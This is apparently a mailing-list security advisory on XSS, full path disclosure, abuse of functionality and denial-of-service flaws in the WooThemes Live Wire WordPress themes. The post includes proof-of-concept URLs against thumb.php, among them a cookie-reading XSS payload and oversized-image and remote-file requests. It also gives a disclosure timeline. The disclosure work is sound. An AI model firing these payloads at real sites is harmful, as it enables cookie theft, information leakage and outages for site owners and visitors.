Hello list!

I want to warn you about Cross-Site Scripting, Full path disclosure, Abuse
of Functionality and Denial of Service vulnerabilities in Live Wire 2.0 and
Live Wire Style themes for WordPress. These are another two themes which
are a part of Live Wire series together with Live Wire Edition. These are
commercial themes for WP by WooThemes.

-------------------------
Affected products:
-------------------------

Vulnerable are Live Wire 2.0 and Live Wire Style version 2.3.1 and previous
versions. XSS is possible only in old versions of the themes. Recently in
version 2.4 most of these vulnerabilities were fixed (but there were still
left many not fixed FPD).

Details:

XSS (WASC-08):

http://site/wp-content/themes/livewire/thumb.php?src=%3Cbody%20onload=alert(document.cookie)%3E.jpg

Full path disclosure (WASC-13):

http://site/wp-content/themes/livewire/thumb.php?src=jpg

http://site/wp-content/themes/livewire/thumb.php?src=http://site/page.png&h=1&w=1111111

http://site/wp-content/themes/livewire/thumb.php?src=http://site/page.png&h=1111111&w=1

http://site/wp-content/themes/livewire/

And also other 30 php-scripts of the theme in folder /livewire/ and all
subfolders.

Abuse of Functionality (WASC-42):

DoS (WASC-10):

http://site/wp-content/themes/livewire/thumb.php?src=http://site/big_file&h=1&w=1

About such AoF and DoS vulnerabilities I wrote in article Using of the sites
for attacks on other sites
(http://lists.grok.org.uk/pipermail/full-disclosure/2010-June/075384.html).

Beside folder /livewire/, these themes also can be placed in folders
/livewire-dev/ and /livewire-package/ (which includes all three themes of
Live Wire series).

Timeline:
------------

2011.02.01 - informed developers about other themes.

2011.02.07 - additionally informed developers about these themes.
